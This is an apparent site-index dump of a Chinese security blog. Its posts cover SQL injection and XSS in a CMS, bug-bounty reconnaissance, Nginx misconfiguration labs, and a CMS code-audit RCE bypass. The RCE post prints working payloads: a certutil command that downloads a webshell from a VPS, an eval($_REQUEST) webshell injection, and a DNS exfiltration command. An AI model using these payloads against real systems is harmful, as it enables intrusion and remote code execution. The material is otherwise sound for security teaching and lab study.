{"meta":{"title":"jasson个人博客","subtitle":"来自一个安全小白的自述～","description":"专注于Web、内网渗透、红蓝攻防、代码审计，分享知识，分享生活。","author":"jasson","url":"https://j-jasson2.github.io","root":"/"},"pages":[{"title":"link","text":"","path":"link/index.html"},{"title":"about","text":"","path":"about/index.html"},{"title":"categories","text":"","path":"categories/index.html"},{"title":"timeline","text":"","path":"timeline/index.html"},{"title":"messageboard","text":"","path":"messageboard/index.html"},{"title":"tags","text":"","path":"tags/index.html"}],"posts":[{"title":"梦想CMS注入漏洞分析&发现小彩蛋","text":"本文已发布到先知社区 作者：ajie 0x01 前言查资料的时候，偶然间看到这样一个漏洞，在一个提交表单的地方，插入SQL语句，便可以进行报错注入。看着有点像二次注入，对于这样类型的注入，我个人遇到的还是比较少的，再加上一般这种地方多数会尝试XSS，所以进行了分析，看看漏洞到底是如何产生的。 0x02 环境搭建1、首先准备phpstudy，这里使用的是2016版本的，php版本为5.6.272、下载cms源码cms下载地址：http://www.lmxcms.com/file/d/down/xitong/20210628/202106281714266126.zip 3、访问http://192.168.150.8/install/进行安装4、输入相应信息即可。注意：需要提前创建好数据库 0x03 漏洞复现1、访问http://192.168.150.8/admin.php?m=Login，输入账号密码进入后台2、在采集管理功能处点击创建节点3、payload如下： 11&#x27; and updatexml(0,concat(0x7e,database()),1) and &#x27; 4、经测试节点名字和备注均能够触发漏洞1）备注功能点触发2）节点名字功能点触发 0x04 漏洞分析1、因为漏洞是sql注入，所以首先可以使用数据库语句监控工具进行监控执行的语句。这里我使用的是seay自带的数据库监控工具。2、输入账号密码，点击下断3、发送sql注入的数据包后，点击更新4、可以看到是一个插入数据库的语句 1INSERT INTO lmx_cj(name,mid,content) VALUES(&#x27;11111111111111111111111&#x27;,&#x27;1&#x27;,&#x27;1&#x27; and updatexml(0,concat(0x7e,database()),1) and &#x27;&#x27;) 5、后面的数据包中可以看到是进行了查询6、这里很明显就是一个插入数据库的功能，将数据插入到lmx_cj表中，因为updatexml函数导致了报错。查看这个数据表，里面是没有数据的。7、插入正常的字符串，里面成功添加了数据。8、那么下面开始代码分析，从数据包中很明显可以看到访问的路径为admin.php?&amp;m=Acquisi&amp;a=add。分析过MVP框架的代码便可以很明显看出一个是对应的文件Acquisi，里面调用了add函数。先来查看一下admin.php文件，里面包含了/inc/config.inc.php和/inc/run.inc.php两个文件。9、分别打开2个文件查看，跟文件名上表示的一样，一个是配置，一个是路由10、其中有一个地方值得注意一下，action即方法是放在根目录下或者extend/目录下的c文件夹中，同理model即模块是放在m文件夹中。然后就是执行问题了，这里可以看到区分了伪静态和单入口，大体意思其实跟tp框架的很像，一者是/模板/方法/参数名/参数值，一者是/?m=模板&amp;a=方法看最后面 1eval(&#x27;$action=new &#x27;.$m.$extendEnt.&#x27;();&#x27;); 这里就是可以定位到漏洞文件所在的地方，很明显传入的m的值为Acquisi，所以这个请求对应的类为AcquisiAction()11、在/c/admin/AcquisiAction.class.php找到了它12、在add方法中可以看到，其实就是检测了是不是有从post请求中传入add，并且在data中的name对应的值不为空。其中存在几个函数分别是d()、p()、add()13、定位一下d()方法，使用foreach函数，数组键分别赋值，看前面可以知道fieldCj就是一个name，mid，content的数组；$type这里有一个很重要的(int)类型强制转换，$is_int为传入的数组mid，并且$v为mid时，将其进行强制转换，也就是post包中传入的mid固定为整型。14、再看一下p()方法，$type=1，$_POST传入的数据赋值给$data；因为前面只传入了一个1，所以$pe、$sql、$mysql均为false；下面在代码注释中进行说明。 1234567891011121314151617181920212223function p($type=1,$pe=false,$sql=false,$mysql=false)&#123; if($type == 1)&#123; $data = $_POST; //进入这里 &#125;else if($type == 2)&#123; $data = $_GET; &#125;else&#123; $data = $type; &#125; if($sql) filter_sql($data); //过 if($mysql) mysql_retain($data); //过 foreach($data as $k =&gt; $v)&#123; if(is_array($v))&#123; //未传入数组，过 $newdata[$k] = p($v,$pe,$sql,$mysql); &#125;else&#123; if($pe)&#123; //过 $newdata[$k] = string::addslashes($v); &#125;else&#123; $newdata[$k] = trim($v); //首尾去空后赋值给数组newdata[] &#125; &#125; &#125; return $newdata;&#125; 15、前面对数据处理完之后，调用了这个类的modle中的add()方法 1$this-&gt;model-&gt;add($data); 所以我们需要在m文件夹中寻找Acquisi的model文件16、打开一看，第一个函数add就是我们需要的17、右键，选择定位函数（其实使用phpstorm快一点，奈何我这个是虚拟机，没有那个条件装那么大的软件）18、很幸运，只有一个，不用进行筛选了19、调用了一个新函数addDB，从字面上的意思理解是添加到数据库，继续定位函数20、找到函数之后进行分析，首先将数据进行键值分离，然后存入到数组field[]和value[]中，关于implode()函数的用法，我百度了一下，可以理解为使用逗号将数组中的每个值进行连接。然后，就放入到sql语句中了。21、然后是执行query函数，将sql语句直接执行，如果没有返回结果就将错误信息返回。22、总结一下利用链首先从admin.php文件 -&gt; 再到/inc/run.inc.php文件 -&gt; 然后调用了传入的m参数值AcquisiAction类 -&gt; AcquisiAction类中的add() -&gt; 对数据经过一些处理，调用了d()、p()函数 -&gt; 调用AcquisiAction类对应的Model中的add方法 -&gt; 调用addModel() -&gt; 调用addDB() -&gt; 在addDB方法中进行了数组的转换就直接放入到sql语句中 -&gt;调用了query()方法，执行了sql语句，然后如果执行结果为空，则将错误打印出来。​ 23、分析之后我发现一个有意思的东西，既然没有经过任何过滤，那么是不是存在存储型XSS漏洞呢，试了一下，确实存在。两个参数均存在。 0x05 总结分析完一条完整的利用链了，漏洞利用那么简单，但是实际分析确实还是有一点难的，当然如果有PHPstrom可能会好一些，函数之间的跳转会方便点，并且可以通过截断数据进行debug调试，也比这样轻松。但是总的来说还是成功分析完了，这里其实有一些地方的分析还是存在不足之处的，也希望大家体谅小白对代码的熟练度还不够。小彩蛋：因为页面会直接返回错误语句，那么这里不就也存在XSS漏洞了？let me try try～ 12首先单引号让数据报错，然后后面插入xss payload&#x27;&lt;img src=1 onerror=alert(1)&gt; 然后，在位置2它出现了～查看了一下，位置1没有触发是因为&lt;不见了那么尝试一下闭合，成功触发。 1&#x27;)&lt;img src=1 onerror=alert(1)&gt;&#x27; ​","path":"2021/10/29/梦想CMS注入漏洞分析&发现小彩蛋/"},{"title":"src漏洞挖掘之有效信息收集","text":"本文已发布到先知社区 作者：ajie 说到信息收集，网上已经有许多文章进行描述了，那么从正常的子域名、端口、旁站、C段等进行信息收集的话，对于正常项目已经够用了，但是挖掘SRC的话，在诸多竞争对手的“帮助”下，大家收集到的信息都差不多，挖掘的漏洞也往往存在重复的情况。 那么现在我就想分享一下平时自己进行SRC挖掘过程中，主要是如何进行入手的。以下均为小弟拙见，大佬勿喷。 0x01 确定目标个人是非常讨厌无目标随便打的，有没有自己对应的SRC应急响应平台不说，还往往会因为一开始没有挖掘到漏洞而随意放弃，这样往往不能挖掘到深层次的漏洞。挖到的大多数是大家都可以简单挖到的漏洞，存在大概率重复可能。所以在真的想要花点时间在SRC漏洞挖掘上的话，建议先选好目标。 那么目标怎么选呢，考虑到收益回报与付出的比例来看，建议是从专属SRC入手，特别在一些活动中，可以获取比平时更高的收益。微信搜一搜：百度搜一搜：现在有活动的src已经浮现水面了，那么我们就可与从中选择自己感兴趣的SRC。 0x02 确认测试范围前面说到确定测什么SRC，那么下面就要通过一些方法，获取这个SRC的测试范围，以免测偏。 1、公众号从公众号推文入手，活动页面中可以发现测试范围 2、应急响应官网在应急响应官网，往往会有一些活动的公告，在里面可以获取到相应的测试范围。 3、爱企查从爱企查等商业查询平台获取公司所属域名搜索想要测试等SRC所属公司名称，在知识产权-&gt;网站备案中可以获取测试范围。 0x03 子域名(oneforall)拿到域名之后，下一步我考虑使用oneforall扫描获取子域名，就像网上信息收集的文章一样，主域名的站点不是静态界面就是安全防护等级极强，不是随便就能够发现漏洞的，我们挖掘SRC也是要从子域名开始，从边缘资产或一般资产中发现漏洞。工具下载： 1https://github.com/shmilylty/OneForAll 具体用法如下：常用的获取子域名有2种选择，一种使用–target指定单个域名，一种使用–targets指定域名文件。 12python3 oneforall.py --target example.com runpython3 oneforall.py --targets ./domains.txt run 其他获取子域名的工具还有layer子域名挖掘机、Sublist3r、证书透明度、在线工具等，这里就不一一阐述了，大体思路是一样等，获取子域，然后从中筛选边缘资产，安全防护低资产。 0x04 系统指纹探测通过上面的方法，我们可以在/OneForAll-0.4.3/results/路径下获取以域名为名字的csv文件。里面放入到便是扫描到到所有子域名以及相应信息了。下一步便是将收集到到域名全部进行一遍指纹探测，从中找出一些明显使用CMS、OA系统、shiro、Fastjson等的站点。下面介绍平时使用的2款工具： 1、Ehole下载地址： 1https://github.com/EdgeSecurityTeam/EHole 使用方法： 123./Ehole-darwin -l url.txt //URL地址需带上协议,每行一个./Ehole-darwin -f 192.168.1.1/24 //支持单IP或IP段,fofa识别需要配置fofa密钥和邮箱./Ehole-darwin -l url.txt -json export.json //结果输出至export.json文件 2、Glass下载地址： 1https://github.com/s7ckTeam/Glass 使用方法： 12python3 Glass.py -u http://www.examples.com // 单url测试python3 Glass.py -w domain.txt -o 1.txt // url文件内 0x05 框架型站点漏洞测试前面经过了子域名收集以及对收集到的子域名进行了指纹信息识别之后，那么对于框架型的站点，我们可以优先进行测试。类似用友NC、通达OA、蓝凌OA等，可以通过尝试现有的Nday漏洞进行攻击。 0x06 非框架型站点漏洞测试前面测试完框架型的站点了，之后就应该往正常网站，或者经过了二开未能直接检测出指纹的站点进行渗透了。那么对于这类站点，最经常遇到的便是登录框，在这里，我们便可以开始测试了。1、用户名枚举抓包尝试是否用户名存在与不存在的情况，返回结果不同。2、验证码是否存在验证码，验证码是否可以抓包截断绕过，验证码是否可以为空。3、暴力破解下面是我收集的集中常见的用户名 12345671.弱口令用户名如admin,test,ceshi等2.员工姓名全拼，员工姓名简拼3.公司特征+员工工号/员工姓名4.员工工号+姓名简拼5.员工姓名全拼+员工工号6.员工姓名全拼+重复次数，如zhangsan和zhangsan017.其他 关于暴力破解我要扯一句了，就是关于密码字典的问题。经常会听到某人说他的字典多么多么的大，有好几个G之类的，但是在我觉得，这很没有必要，有些密码是你跑几天都跑不出来的，就算字典确实够大，也没有必要这样跑，可能影响心情不说，大规模地暴力破解，很容易让人觉得你在拒绝服务攻击。​ 其实我的话一般跑一跑弱口令就差不多了。关于弱口令字典的问题，我也想说一嘴，你最好看看，你字典里面的admin、123456、password处在什么位置。记得之前玩CTF的时候，默认密码123456，但是那个师傅死活做不出来，后面一看，字典里面居然没有123456这个密码。。。​ 这里推荐一个字典，个人感觉还是挺好用的。当然更多的是需要自己不断更新。 1https://github.com/fuzz-security/SuperWordlist 4、工具cupp和cewl对于一些情况，密码不是直接使用弱口令，而是通过一些公司的特征+个人信息制作的，那么这个时候，我们的字典便不能直接使用了，需要在这之前加上一些特征，例如阿里SRC可能是a；百度SRC可能是bd等。下面2款kali自带等工具，可以通过收集信息，生成好用的字典，方便渗透。说真的，在渗透测试过程中，弱口令，YYDS！具体使用说明和工具介绍，可以查看文章：https://mp.weixin.qq.com/s/HOlPaJ4EMY7PfHh7p2d95A5、自行注册如果能够注册那就好办了，自己注册一下账户即可。6、小总结对于非框架的站点，登录接口一般是必不可少的，可能就在主页，也可能在某个路径下，藏着后台的登录接口，在尝试了多种方法成功登录之后，记得尝试里面是否存在未授权漏洞、越权等漏洞。这里借用来自WS师傅的建议：可以直接扫描出来的洞，基本都被交完了，可以更多往逻辑漏洞方面找。登录后的漏洞重复率，比登录前的往往会低很多。 0x07 端口扫描前面就是正常的渗透了，那么一个域名只是在80、443端口才有web服务吗？不可否认有些时候真的是，但是绝大多数情况下，类似8080、8443、8081、8089、7001等端口，往往会有惊喜哦～端口扫描也算是老生常谈了，市面上也有很多介绍端口扫描的工具使用方法，这里也不细说了，就放出平时使用的命令吧。 123sudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v examples.comsudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 examples.com 0x08 目录扫描dirsearch目录扫描在渗透测试过程中我认为是必不可少的，一个站点在不同目录下的不同文件，往往可能有惊喜哦。个人是喜欢使用dirserach这款工具，不仅高效、页面也好看。市面上还有例如御剑、御剑t00ls版等，也是不错的选择。dirsearch下载地址： 1https://github.com/maurosoria/dirsearch 具体使用方法可以查看github介绍，这里我一般是使用如下命令（因为担心线程太高所以通过-t参数设置为2） 1python3 dirsearch.py -u www.xxx.com -e * -t 2 关键的地方是大家都可以下载这款工具，获取它自带的字典，那么路径的话，便是大家都能够搜得到的了，所以这里我推荐是可以适当整合一些师傅们发出来的路径字典到/dirsearch-0.4.2/db/dicc.txt中。例如我的话，是增加了springboot未授权的一些路径、swagger的路径以及一些例如vmvare-vcenter的漏洞路径。 0x09 JS信息收集在一个站点扫描了目录、尝试登录失败并且没有自己注册功能的情况下，我们还可以从JS文件入手，获取一些URL，也许某个URL便能够未授权访问获取敏感信息呢。 1、JSFinder工具下载： 1https://github.com/Threezh1/JSFinder JSFinder是一款用作快速在网站的js文件中提取URL，子域名的工具。个人觉得美中不足的地方便是不能对获取到到URL进行一些过滤，在某些情况下，JS文件中可以爬取非常多的URL，这其中可能大部分是页面空或者返回200但是页面显示404的。来自HZ师傅的建议，可以修改一下工具，基于当前的基础上，检测获取的URL是否可以访问，访问后的页面大小为多少，标题是什么。。。思路放这了，找个时间改一改？ 1234567891011121314#检测URL状态码#-----------------------#! /usr/bin/env python#coding=utf-8import sysimport requestsurl=&#x27;xxxx&#x27;request = requests.get(url)httpStatusCode = request.status_codeif httpStatusCode == 200: xxxxelse: xxxx 123456789101112131415161718#检测URL返回包大小#-----------------------import requestsdef hum_convert(value): units = [&quot;B&quot;, &quot;KB&quot;, &quot;MB&quot;, &quot;GB&quot;, &quot;TB&quot;, &quot;PB&quot;] size = 1024.0 for i in range(len(units)): if (value / size) &lt; 1: return &quot;%.2f%s&quot; % (value, units[i]) value = value / sizer = requests.get(&#x27;https://www.baidu.com&#x27;)r.status_coder.headerslength = len(r.text)print(hum_convert(length)) 1234567891011121314#获取网站标题#-----------------------#!/usr/bin/python#coding=utf-8urllib.requestimport urllib.requestimport reurl = urllib.request.urlopen(&#x27;http://www.xxx.com&#x27;)html = url.read().decode(&#x27;utf-8&#x27;)title=re.findall(&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;,html)print (title) 2、JS文件JS文件与HTML、CSS等文件统一作为前端文件，是可以通过浏览器访问到的，相对于HTML和CSS等文件的显示和美化作用，JS文件将会能够将页面的功能点进行升华。对于渗透测试来说，JS文件不仅仅能够找到一些URL、内网IP地址、手机号、调用的组件版本等信息，还存在一些接口，因为前端需要，所以一些接口将会在JS文件中直接或间接呈现。下面我将介绍如何发现这些隐藏的接口。1、首先在某个页面中，鼠标右键，选择检查2、点击Application3、在Frames-&gt;top-&gt;Scripts中能够获取当前页面请求到的所有JS4、火狐浏览器的话，则是在调试中5、如果你请求的JS文件内容都叠在了前几行的话，下面这个键可以帮你美化输出6、在JS文件中，可以尤为注意带有api字眼的文件或内容，例如下面这里我发现了一个接口。 0x10 小程序、APPweb端没有思路的时候，可以结合小程序、APP来进行渗透。小程序或APP的服务端其实可以在一定程度上与web应用的服务端相联系。也就是说，我们在小程序或者APP上，一样能够挖掘web端的漏洞如SQL注入、XSS等，并且相对来说，这类等服务端安全措施会相对没有那么完备，所以在web端确实没有思路的时候，可以迂回渗透，从小程序、APP中进行。 12345#小程序抓包、APP抓包参考链接：https://mp.weixin.qq.com/s/xuoVxBsN-t5KcwuyGpR56ghttps://mp.weixin.qq.com/s/45YF4tBaR-TUsHyF5RvEswhttps://mp.weixin.qq.com/s/M5xu_-_6fgp8q0KjpzvjLghttps://mp.weixin.qq.com/s/Mfkbxtrxv5AvY-n_bMU7ig 0x11 总结​ 以上就是我个人挖掘SRC的一些信息收集思路，挖掘SRC有的时候真的很看运气，也许别人对一个接口简单Fuzz，便出了一个注入，而我们花了几天，还是一直看到返回内容为404。所以有的时候真的可以换个站试试，也许就挖到高危甚至严重了～​ 作为一名SRC小白，以上内容均为小弟拙见，希望能够通过这篇文章，帮到更多的网络安全小白，没能帮上大佬们真的很抱歉～后续也会持续提高自己，将学到的更多的东西分享给大家。","path":"2021/10/25/src漏洞挖掘之有效信息收集/"},{"title":"Nginx中间件漏洞之add_header被覆盖","text":"0x01 复现环境本地搭建docker+vulhub 123cd vulhub-master cd nginx/insecure-configuration docker-compose up -d 访问http://127.0.0.1:8082/显示如下界面即搭建成功 0x02 漏洞复现首先访问/test1，这里发现设置了Content-Security-Policy访问/test2，Content-Security-Policy被X-Content-Type-Options: nosniff替换了，即安全配置失效。这种情况网上说是可以导致XSS漏洞的，我这里失败了，具体图片如下： 0x03 漏洞分析先看具体配置情况： 1234567891011add_header Content-Security-Policy &quot;default-src &#x27;self&#x27;&quot;; //CSP安全头部add_header X-Frame-Options DENY;location = /test1 &#123; rewrite ^(.*)$ /xss.html break;&#125; location = /test2 &#123; add_header X-Content-Type-Options nosniff; rewrite ^(.*)$ /xss.html break;&#125; 首先可以看到在全局设置了CSP安全头部接下来看到在/test2配置了一个X-Content-Type-Options nosniff; 这里因为子块配置了X-Content-Type-Options，所以父块的配置失效，所以存在漏洞。","path":"2021/08/07/Nginx中间件漏洞之add_header被覆盖/"},{"title":"Nginx中间件漏洞之目录穿越","text":"0x01 复现环境本地搭建docker+vulhub 123cd vulhub-master cd nginx/insecure-configuration docker-compose up -d 访问http://127.0.0.1:8081/files/显示如下界面即搭建成功 0x02 漏洞复现这个常见于 Nginx 做反向代理的情况，动态的部分被 proxy_pass 传递给后端端口，而静态文件需要 Nginx 来处理。假设静态文件存储在 /home/ 目录下，而该目录在 url 中名字为 files ，那么就需要用 alias 设置目录的别名： 123location /files &#123; alias /home/;&#125; 当使用如下配置的情况下，就存在目录穿越漏洞，payload如下： 1http://127.0.0.1:8081/files../ 0x03 漏洞分析正常输入http:ip:port/files/help.txt，访问到file目录下到help.txt文件根据配置情况可以发现，/file的后面没有/，也就是只要输入/file便表示代理到服务器的/home/目录下了。当我们输入/file../，在服务器上对应的就是/home/../，所以跳转到根目录，造成了目录穿越，如下图：","path":"2021/08/06/Nginx中间件漏洞之目录穿越/"},{"title":"Nginx中间件漏洞之CRLF注入","text":"0x01 复现环境本地搭建docker+vulhub 123cd vulhub-master cd nginx/insecure-configuration docker-compose up -d 0x02 漏洞复现8080所在位置为CRLF注入漏洞1、修改burp抓取数据包的端口为80892、访问http://127.0.0.1/，页面会强制跳转到https://127.0.0.1，数据包如下3、注意这里的Location参数值为即将要跳转的路径，下面更换访问路径如下： 1http://127.0.0.1:8080/%0a%0dSet-Cookie:%20a=1 可以看到成功注入了Set-Cookie头，这里成功为攻击者设置了一个cookie，造成了会话固定漏洞。 4、CRLF注入当然不仅能造成会话固定，当换行多一个的时候，便能够将内容输入到页面上，这里很明显到一个反射型XSS漏洞，payload如下： 1http://127.0.0.1:8080/%0D%0ASet-Cookie:%20ajie123%0d%0a%0d%0a&lt;img src=1 onerror=alert(1)&gt; 0x03 漏洞分析CRLF即回车换行，用字节来表示的话是\\r\\n，URL中就是%0D%0A，在http的header头部字段中，每一个参数后会自动跟上一个\\r\\n，也就是说如果没有正确识别我们输入的回车换行字段时，便可以通过回车换行使页面显示我们需要的数据。 即如下情况:正常的返回包 1234567HTTP/1.1 302 Moved Temporarily[\\r\\n]Server: nginx/1.13.0[\\r\\n]Date: Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]Content-Type: text/html[\\r\\n]Content-Length: 161[\\r\\n]Connection: close[\\r\\n]Location: https://127.0.0.1/[\\r\\n] 设置cookie的返回包： 1234567HTTP/1.1 302 Moved Temporarily[\\r\\n]Server: nginx/1.13.0[\\r\\n]Date: Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]Content-Type: text/html[\\r\\n]Content-Length: 161[\\r\\n]Connection: close[\\r\\n]Location: https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1 设置xss的返回包： 1234567HTTP/1.1 302 Moved Temporarily[\\r\\n]Server: nginx/1.13.0[\\r\\n]Date: Tue, 20 Jul 2021 06:57:29 GMT[\\r\\n]Content-Type: text/html[\\r\\n]Content-Length: 161[\\r\\n]Connection: close[\\r\\n]Location: https://127.0.0.1/[\\r\\n][\\r\\n]%0a%0dSet-Cookie:%20a=1[\\r\\n][\\r\\n]&lt;img src=1 onerror=alert(1)&gt;","path":"2021/08/05/Nginx中间件漏洞之CRLF注入/"},{"title":"某cms代码审计RCE&艰难bypass(思路清奇)","text":"本文已发布到先知社区：https://xz.aliyun.com/t/9990 作者：ajie 0x01 前言闲来无事挖挖漏洞，发现一个经过了一些过滤的漏洞，踩了无数的坑，然后冥思苦想了许多方法，终于找到了一个点，使得可以进行命令执行与getshell。这里的漏洞点不值一提，但是因为绕过方法挺好玩的，故在这里分享一下思路，大佬勿喷～思路不唯一，也希望有其他方法的话，大佬们可以不吝赐教，在评论区留下具体方法，谢谢大家～ 0x02 代码审计环境此次代码审计采用的是phpstudy一键式搭建。phpstudy下载地址：https://www.xp.cn/download.html代码审计分析工具：nopad++，seay源代码分析工具 0x03 开始审计话不多说，先看一下目录结构，很明显的tp5框架在\\thinkphp\\base.php文件中也可以看到对应的tp版本号（5.0.24版本好像有个反序列化，其实也可以尝试一下）虽然seay用现有的规则扫描扫出来的漏洞不太准确，但是帮忙定位危险函数还是可以的，所以我一般都会先进行自动审计。接下来就是一个个漏洞分析了，都点进去看一看。其实只需要看2点：1.用户可以控制输入的内容2.输入的内容被放到危险函数中进行了执行(需要进行流程跟进的话还是推荐使用phpstorm工具的，我这里因为是在虚拟机中，就简单用了seay和nopad++代替) 0x04 漏洞点分析1、具体我发现这个漏洞是在/app/admin/controller/api.php文件下的debug函数 1234567891011121314151617181920public function debug() &#123; $path = &#x27;app/extra/debug.php&#x27;; $file = include $path; $config = array( &#x27;name&#x27; =&gt; input(&#x27;id&#x27;), ); $config = preg_replace(&quot;/[?&gt;&lt;?]/&quot;, &#x27;&#x27;, $config); $res = array_merge($file, $config); $str = &#x27;&lt;?php return [&#x27;; foreach ($res as $key =&gt; $value) &#123; $str .= &#x27;\\&#x27;&#x27; . $key . &#x27;\\&#x27;&#x27; . &#x27;=&gt;&#x27; . &#x27;\\&#x27;&#x27; . $value . &#x27;\\&#x27;&#x27; . &#x27;,&#x27;; &#125; $str .= &#x27;]; &#x27;; if (file_put_contents($path, $str)) &#123; return json(array(&#x27;code&#x27; =&gt; 1, &#x27;msg&#x27; =&gt; &#x27;操作成功&#x27;)); &#125; else &#123; return json(array(&#x27;code&#x27; =&gt; 0, &#x27;msg&#x27; =&gt; &#x27;操作失败&#x27;)); &#125; &#125; 在代码第15行通过file_put_contents()函数将id传参的内容写入到app/extra/debug.php文件中。2、可以看到上面进行了一些过滤，将&lt;&gt;和?替换为空 1$config = preg_replace(&quot;/[?&gt;&lt;?]/&quot;, &#x27;&#x27;, $config); 3、这里直接将不太清晰，实战演示一下，首先访问后台路径，这里有个debug功能，就是上面debug函数的功能点。http://127.0.0.1/index.php/admin/4、具体使用时发现报错了，那就直接访问对应的函数，路由规则就是/index.php/目录-文件-函数.html?传参=。这里我传参123进行测试http://127.0.0.1/index.php/admin-api-debug.html?id=1235、在debug.php文件中可以看到123是放到数组中的值处，而我们可以控制这里的值。 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;,]; 6、下面讲解我进行绕过的思路以及遇到的坑。 0x05 绕过思路第一次踩坑1、首先，这里因为没有过滤单引号和中括号，所以我们可以手动闭合 12payload:http://127.0.0.1/index.php/admin-api-debug.html?id=123%27];phpinfo();// 这里可以看到数据是成功写入进文件中的 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;];phpinfo();//&#x27;,]; 2、访问debug.php文件试试发现，页面并没有返回想要的内容3、这里我想了好久，想着试试更换echo输出看看 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;];echo &#x27;12344321&#x27;;//&#x27;,]; 在页面中并没有输出4、查阅资料之后理解了return后代码不再向下执行，此路不通参考链接：https://www.cnblogs.com/gzpu/p/13736420.html 第二次踩坑1、既然不能通过分号结束代码后执行其他代码的话，我能不能在return中执行代码呢，此处进行了尝试 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;,eval($_REQUEST[1]);&#x27;&#x27;,]; 于是……页面报错了2、再试试换行 1http://127.0.0.1/index.php/admin-api-debug.html?id=123%27,%0aeval($_REQUEST[1]);%27 好的，还是不执行 第三次，渐渐好起来了1、因为代码执行行不通，那我就想着试试命令执行看可不可以。先申请一个dnslog，链接：http://dnslog.cn/2、使用.拼接反引号执行命令 1http://127.0.0.1/index.php/admin-api-debug.html?id=123%27].`ping%20123.yh6nta.dnslog.cn`;// 查看文件情况 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;].`ping 123.yh6nta.dnslog.cn`;//&#x27;,]; 访问看看，发现报错了，但是dnslog记录了数据，命令执行成功了 3、这里报错怀疑是使用了点进行拼接，两边的字符类型不匹配，因为命令执行可以使用符号进行连接，所以在这里将点替换成&amp;。因为&amp;在url中还有其他含义，所以先进行url编码。 123123&#x27;]&amp;`ping 123.yh6nta.dnslog.cn`;//#url编码123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F 1http://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F 查看文件情况 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;]&amp;`ping 123.yh6nta.dnslog.cn`;//&#x27;,]; 访问debug.php文件，页面没有报错，而且dnslog成功回显4、既然可以执行命令了，很明显这里是无回显的情况，那么怎么拿到shell呢PHP无回显情况下的渗透测试可以参考此文章：https://xz.aliyun.com/t/9916 Linux系统1234这里不细说，只要命令没有&lt;、&gt;、?即可1、nc反弹shell2、配合其他组件，如redis等3、等等～ Windows系统1、第一次尝试123使用`ping `whoami`.yh6nta.dnslog.cn`，失败使用`ping /`whoami/`.yh6nta.dnslog.cn`，失败使用`ping %系统变量%.yh6nta.dnslog.cn`，失败 2、第二次尝试使用系统命令外带数据，首先我在文件中直接修改，发现可以成功外带数据 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;]&amp;`cmd /c whoami &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,-1%.yh6nta.dnslog.cn)&amp;del temp`;//&#x27;,]; 后面发现，这条命令中含有一个&gt;号，苦恼好久，暂时放弃。不过我觉得这个命令可以适当优化，然后就可以使用了。 3、第三次尝试，成功getshell这里借鉴了XX师傅的建议，通过命令下载文件getshell 1、首先需要准备一个文件，内容为一句话木马，放到vps的web服务中。（当然起一个python的http服务也可以，主要是要可以访问获取。） 2、windows中可以使用certutil下载文件 123456#payload：&#x27;]&amp;`certutil -urlcache -split -f http://vps地址:83/shell 1.php`;//#url编码：%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F#通过id传参：http://127.0.0.1/index.php/admin-api-debug.html?id=%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F 3、查看debug.php文件情况4、访问debug.php后，会在当前目录生成1.php，内容为一句话木马5、执行phpinfo函数 原来竟然如此简单？1、因为前面命令执行可以使用符号进行连接，我想着在代码中也试试，看看能不能直接执行一句话木马（测试了｜、｜｜、&amp;、&amp;&amp;，只有&amp;和&amp;&amp;的时候可以执行）同样先进行url编码 123123&#x27;]&amp;&amp;eval($_REQUEST[1]);//#url编码123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F 1http://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F 在文件中是这样的 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;]&amp;&amp;eval($_REQUEST[1]);//&#x27;,]; 尝试访问，成功执行代码居然就这样就可以了…… 0x06 总结本次代码审计发现漏洞很快，但是利用起来整了我2天，还是在师傅们的帮助下完成的深入利用。忽然发现自己对于编程语言的基础还很不扎实，一些简单处理的地方居然思考了那么久，在之前发现漏洞的情况下，一般都是可以直接利用了，此次bypass的时候发现了很多不足。在以后的代码审计中，简单利用的漏洞只会越来越少，我还需要多深入学习代码知识，才能从一些过滤薄弱点出发，发现漏洞。嗯嗯，总结一句话，不论是学什么东西，基础很重要很重要！","path":"2021/08/03/某cms代码审计RCE&艰难bypass(思路清奇)/"},{"title":"Oracle数据库注入环境搭建","text":"0x01 安装Oracle数据库1、首先下载数据库安装软件具体可以从参考这里，我是从他的百度云下载的https://blog.csdn.net/qq_32786873/article/details/811872082、点击setup.exe安装即可（安装过程不过多阐述，没什么太大区别，就下一步下一步即可） 3、开启oracle数据库 打开cmd，连接数据库 12345C:\\Users\\user&gt;sqlplus请输入用户名: system输入口令:连接到:Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production 防止网络不通，建议关闭防火墙4、使用navicat连接数据库（system:root）5、也可以使用sql plus新建用户 0x02 